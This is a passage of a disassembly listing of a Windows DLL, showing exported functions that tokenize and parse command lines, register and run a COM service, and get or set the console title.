		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_48]
		inc	esi
		call	Ordinal752
		mov	eax, esi

loc_6AF3D903:				; CODE XREF: Ordinal457+C2j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal457	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D91C	proc near		; DATA XREF: .rdata:6AF62E40o
		push	13h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	ecx, [ebp-50h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3D8EA
		retn
sub_6AF3D91C	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D95F	proc near		; DATA XREF: .rdata:6AF62E50o
		push	15h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	eax, [ebp-4Ch]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3D8EA
		retn
sub_6AF3D95F	endp

; Exported entry 460.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal460
Ordinal460	proc near		; CODE XREF: Ordinal451+81p
					; DATA XREF: .rdata:off_6AF66098o

var_54		= byte ptr -54h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_66 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 50h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	offset aCcommandlineTo ; "CCommandLine::Tokenize()"
		lea	ecx, [ebp+var_54]
		mov	[ebp+var_14], eax
		call	Ordinal751
		and	[ebp+var_4], 0
		lea	ecx, [ebp+var_28]
		call	sub_6AF318C3
		and	[ebp+var_2C], 0
		mov	byte ptr [ebp+var_4], 2

loc_6AF3D9F0:				; CODE XREF: Ordinal460+156j
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+var_2C]
		push	eax		; int
		push	offset asc_6AF583E0 ; "	"
		lea	eax, [ebp+var_34]
		push	eax		; int
		call	sub_6AF3CDE8
		push	eax
		lea	ecx, [ebp+var_28]
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF31C41
		mov	ecx, [ebp+var_34]
		add	ecx, 0FFFFFFF0h
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF3160D
		mov	esi, [ebp+var_28]
		mov	eax, [esi-0Ch]
		test	eax, eax
		jnz	short loc_6AF3DA65
		lea	ecx, [esi-10h]
		call	sub_6AF3160D

loc_6AF3DA33:				; DATA XREF: sub_6AF3DB0F+3Do
					; sub_6AF3DB52+4Fo
		lea	ecx, [ebp+var_54]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_54]
		inc	esi
		call	Ordinal752
		mov	eax, esi

loc_6AF3DA4C:				; CODE XREF: Ordinal460+113j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
; ---------------------------------------------------------------------------

loc_6AF3DA65:				; CODE XREF: Ordinal460+75j
		jl	short loc_6AF3DA81
		cmp	byte ptr [esi],	22h
		jnz	short loc_6AF3DA7A
		dec	eax
		push	eax
		lea	ecx, [ebp+var_28]
		call	sub_6AF3CB21
		cmp	al, 22h
		jnz	short loc_6AF3DA95

loc_6AF3DA7A:				; CODE XREF: Ordinal460+B6j
		mov	eax, [esi-0Ch]
		test	eax, eax
		jge	short loc_6AF3DA8B

loc_6AF3DA81:				; CODE XREF: Ordinal460:loc_6AF3DA65j
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF3DA8B:				; CODE XREF: Ordinal460+CBj
		cmp	byte ptr [esi],	22h
		jnz	short loc_6AF3DAFE
		cmp	eax, 1
		jnz	short loc_6AF3DAFE

loc_6AF3DA95:				; CODE XREF: Ordinal460+C4j
		mov	edi, [ebp+var_2C]
		mov	ecx, [ebp+arg_0]
		push	edi
		push	22h
		call	sub_6AF3CAEF
		mov	ebx, eax
		cmp	ebx, 0FFFFFFFFh
		jnz	short loc_6AF3DAC9
		push	offset aCcommandline_2 ; "CCommandLine::Tokenize() : sString.Find"...
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [esi-10h]
		call	sub_6AF3160D
		lea	ecx, [ebp+var_54]
		call	Ordinal752
		xor	eax, eax
		jmp	short loc_6AF3DA4C
; ---------------------------------------------------------------------------

loc_6AF3DAC9:				; CODE XREF: Ordinal460+F4j
		mov	ecx, [ebp+arg_0]
		mov	eax, ebx
		sub	eax, edi
		inc	eax
		inc	eax
		push	eax		; Size
		dec	edi
		push	edi		; int
		lea	eax, [ebp+var_30]
		push	eax		; int
		call	sub_6AF3CCD8
		push	eax
		lea	ecx, [ebp+var_28]
		mov	byte ptr [ebp+var_4], 4
		call	sub_6AF3B274
		mov	ecx, [ebp+var_30]
		add	ecx, 0FFFFFFF0h
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF3160D
		inc	ebx
		mov	[ebp+var_2C], ebx

loc_6AF3DAFE:				; CODE XREF: Ordinal460+DAj
					; Ordinal460+DFj
		mov	ecx, [ebp+arg_4]
		lea	eax, [ebp+var_28]
		push	eax
		call	sub_6AF3D777
		jmp	loc_6AF3D9F0
Ordinal460	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3DB0F	proc near		; DATA XREF: .rdata:6AF62EC0o
		push	13h
		lea	ecx, [ebp-54h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-54h]
		call	Ordinal762
		mov	ecx, [ebp-5Ch]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-54h]
		call	Ordinal764
		lea	ecx, [ebp-54h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3DA33
		retn
sub_6AF3DB0F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3DB52	proc near		; DATA XREF: .rdata:6AF62ED0o
		push	15h
		lea	ecx, [ebp-54h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-54h]
		call	Ordinal762
		mov	eax, [ebp-58h]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-54h]
		call	Ordinal764
		lea	ecx, [ebp-54h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3DA33
		retn
sub_6AF3DB52	endp

; Exported entry 451.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal451(int,	char *Src)
		public Ordinal451
Ordinal451	proc near		; CODE XREF: Ordinal449+2Ep
					; Ordinal1074+328p
					; DATA XREF: ...

var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_24		= byte ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Src		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_67 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		lea	ecx, [edi+0Ch]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		call	sub_6AF3D218
		push	offset aCcommandlinePa ; "CCommandLine::Parse()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		xor	ebx, ebx
		cmp	[ebp+Src], ebx
		mov	[ebp+var_4], ebx
		mov	byte ptr [ebp+var_4], 1
		lea	ecx, [edi+8]
		jnz	short loc_6AF3DBF1
		push	offset asc_6AF59020 ; "/-"
		jmp	short loc_6AF3DBF4
; ---------------------------------------------------------------------------

loc_6AF3DBF1:				; CODE XREF: Ordinal451+41j
		push	[ebp+Src]	; Src

loc_6AF3DBF4:				; CODE XREF: Ordinal451+48j
		call	sub_6AF31B1D
		cmp	[ebp+arg_0], ebx
		jnz	short loc_6AF3DC07
		call	ds:GetCommandLineA
		push	eax
		jmp	short loc_6AF3DC0A
; ---------------------------------------------------------------------------

loc_6AF3DC07:				; CODE XREF: Ordinal451+55j
		push	[ebp+arg_0]	; Src

loc_6AF3DC0A:				; CODE XREF: Ordinal451+5Ej
		lea	esi, [edi+4]
		mov	ecx, esi
		call	sub_6AF31B1D
		mov	[ebp+var_20], ebx
		mov	[ebp+var_1C], ebx
		mov	[ebp+var_18], ebx
		lea	eax, [ebp+var_24]
		push	eax
		push	esi
		mov	ecx, edi
		mov	byte ptr [ebp+var_4], 2
		call	Ordinal460
		test	eax, eax
		jnz	short loc_6AF3DC41
		push	offset aCcommandline_3 ; "CCommandLine::Parse()	: Tokenize() ==	F"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF3DD01
; ---------------------------------------------------------------------------

loc_6AF3DC41:				; CODE XREF: Ordinal451+88j
		lea	ecx, [ebp+Src]
		call	sub_6AF318C3
		mov	ebx, [ebp+var_20]
		mov	esi, [ebp+Src]
		mov	byte ptr [ebp+var_4], 3

loc_6AF3DC53:				; CODE XREF: Ordinal451+171j
		cmp	ebx, [ebp+var_1C]
		jz	loc_6AF3DD1D
		push	ebx
		lea	ecx, [ebp+Src]
		call	sub_6AF31C41
		mov	esi, [ebp+Src]
		xor	eax, eax
		cmp	[esi-0Ch], eax
		jge	short loc_6AF3DC79
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF3DC79:				; CODE XREF: Ordinal451+C6j
		cmp	byte ptr [esi],	22h
		jnz	short loc_6AF3DCDE
		push	1
		lea	eax, [ebp+arg_0]
		push	eax
		lea	ecx, [ebp+Src]
		call	sub_6AF3CE87
		push	eax
		lea	ecx, [ebp+Src]
		mov	byte ptr [ebp+var_4], 4
		call	sub_6AF31C41
		mov	ecx, [ebp+arg_0]
		add	ecx, 0FFFFFFF0h
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF3160D
		mov	eax, [ebp+Src]
		mov	eax, [eax-0Ch]
		dec	eax
		push	eax		; Size
		lea	eax, [ebp+var_28]
		push	eax		; int
		lea	ecx, [ebp+Src]
		call	sub_6AF3CD3D
		push	eax
		lea	ecx, [ebp+Src]
		mov	byte ptr [ebp+var_4], 5
		call	sub_6AF31C41
		mov	ecx, [ebp+var_28]
		add	ecx, 0FFFFFFF0h
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF3160D
		mov	esi, [ebp+Src]
		xor	eax, eax
		inc	eax

loc_6AF3DCDE:				; CODE XREF: Ordinal451+D5j
		push	eax
		lea	eax, [ebp+Src]
		push	eax
		mov	ecx, edi
		call	Ordinal457
		test	eax, eax
		jnz	short loc_6AF3DD15
		push	offset aCcommandline_4 ; "CCommandLine::Parse()	: ProcessCommand("...
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [esi-10h]
		call	sub_6AF3160D

loc_6AF3DD01:				; CODE XREF: Ordinal451+95j
		lea	ecx, [ebp+var_24]
		call	sub_6AF3D195
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		xor	eax, eax
		jmp	short loc_6AF3DD46
; ---------------------------------------------------------------------------

loc_6AF3DD15:				; CODE XREF: Ordinal451+145j
		add	ebx, 4
		jmp	loc_6AF3DC53
; ---------------------------------------------------------------------------

loc_6AF3DD1D:				; CODE XREF: Ordinal451+AFj
		lea	ecx, [esi-10h]
		call	sub_6AF3160D
		lea	ecx, [ebp+var_24]
		call	sub_6AF3D195

loc_6AF3DD2D:				; DATA XREF: sub_6AF3DD5F+3Do
					; sub_6AF3DDA2+4Fo
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_48]
		inc	esi
		call	Ordinal752
		mov	eax, esi

loc_6AF3DD46:				; CODE XREF: Ordinal451+16Cj
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal451	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3DD5F	proc near		; DATA XREF: .rdata:6AF62F48o
		push	13h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	ecx, [ebp-50h]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3DD2D
		retn
sub_6AF3DD5F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3DDA2	proc near		; DATA XREF: .rdata:6AF62F58o
		push	15h
		lea	ecx, [ebp-48h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-48h]
		call	Ordinal762
		mov	eax, [ebp-4Ch]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-48h]
		call	Ordinal764
		lea	ecx, [ebp-48h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF3DD2D
		retn
sub_6AF3DDA2	endp

; Exported entry 449.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal449(int,	char *Src)
		public Ordinal449
Ordinal449	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Src		= dword	ptr  8

		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF58F0C
		call	sub_6AF318C3
		lea	ecx, [esi+8]
		call	sub_6AF318C3
		push	[esp+4+Src]	; Src
		xor	eax, eax
		push	[esp+8+arg_0]	; int
		mov	ecx, esi
		mov	[esi+10h], eax
		mov	[esi+14h], eax
		mov	[esi+18h], eax
		call	Ordinal451
		test	eax, eax
		jnz	short loc_6AF3DE39
		push	offset aCcommandlineCc ; "CCommandLine::CCommandLine() : Parse() "...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3DE39:				; CODE XREF: Ordinal449+35j
		mov	eax, esi
		pop	esi
		retn	8
Ordinal449	endp

; Exported entry 463.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal463
Ordinal463	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal1072
		and	dword ptr [esi+3A4h], 0
		mov	dword ptr [esi], offset	off_6AF59070
		mov	dword ptr [esi+3A0h], 1
		mov	eax, esi
		pop	esi
		retn
Ordinal463	endp

; Exported entry 464.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal464
Ordinal464	proc near		; CODE XREF: sub_6AF3DEDF+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF59070
		jmp	Ordinal1073
Ordinal464	endp

; Exported entry 465.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal465
Ordinal465	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+3A4h]
		retn
Ordinal465	endp

; Exported entry 466.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal466
Ordinal466	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
lpSourceName	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_10]	; int
		mov	eax, [ebp+arg_0]
		push	[ebp+arg_C]	; int
		mov	[ecx+3A4h], eax
		push	[ebp+arg_8]	; int
		push	[ebp+lpSourceName] ; lpSourceName
		call	Ordinal1074
		pop	ebp
		retn	14h
Ordinal466	endp

; Exported entry 474.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal474
Ordinal474	proc near		; CODE XREF: Ordinal467+3p Ordinal468p ...
		mov	ecx, [ecx+3A4h]
		mov	eax, [ecx]
		push	0
		push	0
		call	dword ptr [eax+18h]
		test	eax, eax
		jge	short loc_6AF3DEB8
		push	eax		; Args
		push	offset aCcomserviceReg ; "CComService::RegisterStandalone() : m_p"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3DEB8:				; CODE XREF: Ordinal474+11j
		xor	eax, eax
		inc	eax
		retn
Ordinal474	endp

; Exported entry 476.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal476
Ordinal476	proc near		; CODE XREF: Ordinal469p Ordinal471+3p
					; DATA XREF: ...
		mov	ecx, [ecx+3A4h]
		mov	eax, [ecx]
		call	dword ptr [eax+1Ch]
		test	eax, eax
		jge	short loc_6AF3DEDB
		push	eax		; Args
		push	offset aCcomserviceUnr ; "CComService::Unregister() : m_pComModul"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3DEDB:				; CODE XREF: Ordinal476+Dj
		xor	eax, eax
		inc	eax
		retn
Ordinal476	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3DEDF(void *, char)
sub_6AF3DEDF	proc near		; DATA XREF: .rdata:off_6AF59070o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal464
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3DEF5
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3DEF5:				; CODE XREF: sub_6AF3DEDF+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3DEDF	endp

; Exported entry 467.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal467
Ordinal467	proc near		; DATA XREF: .rdata:6AF590D0o
					; .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal474
		test	eax, eax
		jnz	short loc_6AF3DF17
		push	offset aCcomserviceOnr ; "CComService::OnRunEmbedded() : Register"...
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF3DF17:				; CODE XREF: Ordinal467+Aj
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1101
Ordinal467	endp

; Exported entry 468.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal468
Ordinal468	proc near		; DATA XREF: .rdata:6AF590D4o
					; .rdata:off_6AF66098o
		call	Ordinal474
		test	eax, eax
		jnz	short loc_6AF3DF37
		push	offset aCcomserviceO_0 ; "CComService::OnRegServer() : RegisterSt"...
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		retn
; ---------------------------------------------------------------------------

loc_6AF3DF37:				; CODE XREF: Ordinal468+7j
		xor	eax, eax
		retn
Ordinal468	endp

; Exported entry 469.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal469
Ordinal469	proc near		; DATA XREF: .rdata:6AF590D8o
					; .rdata:off_6AF66098o
		call	Ordinal476
		test	eax, eax
		jnz	short loc_6AF3DF52
		push	offset aCcomserviceOnu ; "CComService::OnUnRegServer() : Unregist"...
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		retn
; ---------------------------------------------------------------------------

loc_6AF3DF52:				; CODE XREF: Ordinal469+7j
		xor	eax, eax
		retn
Ordinal469	endp

; Exported entry 471.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal471
Ordinal471	proc near		; DATA XREF: .rdata:6AF590E0o
					; .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal476
		test	eax, eax
		jnz	short loc_6AF3DF71
		push	offset aCcomserviceO_1 ; "CComService::OnRemoveService() : Unregi"...
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF3DF71:				; CODE XREF: Ordinal471+Aj
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1099
Ordinal471	endp

; Exported entry 473.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal473
Ordinal473	proc near		; DATA XREF: .rdata:6AF590E4o
					; .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal474
		test	eax, eax
		jnz	short loc_6AF3DF95
		push	offset aCcomserviceO_2 ; "CComService::OnRunDebug() : RegisterSta"...
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_6AF3DF95:				; CODE XREF: Ordinal473+Aj
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1096
Ordinal473	endp

; Exported entry 475.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal475
Ordinal475	proc near		; CODE XREF: Ordinal470+11p
					; Ordinal472+11p
					; DATA XREF: ...
		mov	eax, [ecx+38h]
		mov	ecx, [ecx+3A4h]
		mov	edx, [ecx]
		push	eax
		push	1
		call	dword ptr [edx+18h]
		test	eax, eax
		jge	short loc_6AF3DFC2
		push	eax		; Args
		push	offset aCcomserviceR_0 ; "CComService::RegisterService() : m_pCom"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF3DFC2:				; CODE XREF: Ordinal475+13j
		xor	eax, eax
		inc	eax
		retn
Ordinal475	endp

; Exported entry 470.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal470
Ordinal470	proc near		; DATA XREF: .rdata:6AF590DCo
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, ecx
		lea	ecx, [esi+3Ch]
		call	Ordinal942
		test	eax, eax
		mov	ecx, esi
		jz	short loc_6AF3DFE7
		call	Ordinal475
		test	eax, eax
		jnz	short loc_6AF3E000
		push	offset aCcomserviceOni ; "CComService::OnInstallService() : Regis"...
		jmp	short loc_6AF3DFF5
; ---------------------------------------------------------------------------

loc_6AF3DFE7:				; CODE XREF: Ordinal470+Fj
		call	Ordinal474
		test	eax, eax
		jnz	short loc_6AF3E000
		push	offset aCcomserviceO_3 ; "CComService::OnInstallService() : Regis"...

loc_6AF3DFF5:				; CODE XREF: Ordinal470+1Fj
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		jmp	short loc_6AF3E00F
; ---------------------------------------------------------------------------

loc_6AF3E000:				; CODE XREF: Ordinal470+18j
					; Ordinal470+28j
		push	[esp+4+arg_4]
		mov	ecx, esi
		push	[esp+8+arg_0]
		call	Ordinal1098

loc_6AF3E00F:				; CODE XREF: Ordinal470+38j
		pop	esi
		retn	8
Ordinal470	endp

; Exported entry 472.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal472
Ordinal472	proc near		; DATA XREF: .rdata:6AF590E8o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		lea	ecx, [esi+3Ch]
		call	Ordinal942
		test	eax, eax
		mov	ecx, esi
		jz	short loc_6AF3E034
		call	Ordinal475
		test	eax, eax
		jnz	short loc_6AF3E04D
		push	offset aCcomserviceO_4 ; "CComService::OnRunService() :	RegisterS"...
		jmp	short loc_6AF3E042
; ---------------------------------------------------------------------------

loc_6AF3E034:				; CODE XREF: Ordinal472+Fj
		call	Ordinal474
		test	eax, eax
		jnz	short loc_6AF3E04D
		push	offset aCcomserviceO_5 ; "CComService::OnRunService() :	RegisterS"...

loc_6AF3E042:				; CODE XREF: Ordinal472+1Fj
		call	sub_6AF3102E
		pop	ecx
		or	eax, 0FFFFFFFFh
		jmp	short loc_6AF3E058
; ---------------------------------------------------------------------------

loc_6AF3E04D:				; CODE XREF: Ordinal472+18j
					; Ordinal472+28j
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	Ordinal1095

loc_6AF3E058:				; CODE XREF: Ordinal472+38j
		pop	esi
		retn	4
Ordinal472	endp

; Exported entry 479.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal479
Ordinal479	proc near		; CODE XREF: Ordinal477+21p
					; Ordinal481+110p
					; DATA XREF: ...
		push	ebx
		xor	ebx, ebx
		push	esi
		mov	esi, ecx
		push	16h		; Size
		lea	eax, [esi+54h]
		push	ebx		; Val
		push	eax		; Dst
		mov	[esi+38h], ebx
		mov	[esi+3Ch], ebx
		mov	[esi+40h], ebx
		mov	[esi+50h], ebx
		mov	[esi+6Ch], ebx
		mov	[esi+70h], ebx
		call	memset
		add	esp, 0Ch
		mov	[esi+74h], bl
		mov	[esi+44h], ebx
		mov	[esi+48h], ebx
		mov	[esi+4Ch], ebx
		pop	esi
		pop	ebx
		retn
Ordinal479	endp

; Exported entry 482.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal482(LPCSTR lpString2)
		public Ordinal482
Ordinal482	proc near		; CODE XREF: Ordinal514+60p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
lpString2	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+174h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	[ebp+lpString2]	; lpString
		call	ds:lstrlenA
		cmp	eax, 0FFh
		jbe	short loc_6AF3E0CD
		push	offset aCconsoleSettit ; "CConsole::SetTitle() : lstrlen(szTitle)"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3E0E3
; ---------------------------------------------------------------------------

loc_6AF3E0CD:				; CODE XREF: Ordinal482+2Aj
		push	[ebp+lpString2]	; lpString2
		add	esi, 74h
		push	esi		; lpString1
		call	ds:lstrcpyA
		push	esi		; lpConsoleTitle
		call	ds:SetConsoleTitleA
		mov	esi, eax

loc_6AF3E0E3:				; CODE XREF: Ordinal482+39j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal482	endp

; Exported entry 483.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal483
Ordinal483	proc near		; CODE XREF: Ordinal1096+3Ep
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+174h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		add	esi, 74h
		push	100h		; nSize
		push	esi		; lpConsoleTitle
		mov	byte ptr [esi],	0
		call	ds:GetConsoleTitleA
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal483	endp

; Exported entry 484.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal484
Ordinal484	proc near		; CODE XREF: Ordinal1096+2Fp
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+174h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+3Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal484	endp

; Exported entry 485.

; =============== S U B	R O U T	I N E =======================================

